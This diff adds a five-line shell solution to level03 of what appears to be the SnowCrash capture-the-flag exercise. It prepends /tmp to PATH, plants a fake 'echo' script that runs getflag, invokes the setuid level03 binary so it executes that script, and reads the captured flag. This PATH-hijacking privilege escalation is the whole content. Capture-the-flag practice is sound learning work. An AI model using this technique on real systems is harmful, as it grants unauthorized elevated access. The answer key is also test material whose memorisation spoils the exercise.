@@ -1,0 +1,5 @@
+[snowcrash]
+export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+echo -e "#\!/bin/bash\ngetflag > /tmp/pasta" > /tmp/echo && chmod 777 /tmp/echo
+/home/user/level03/./level03
+cat /tmp/pasta
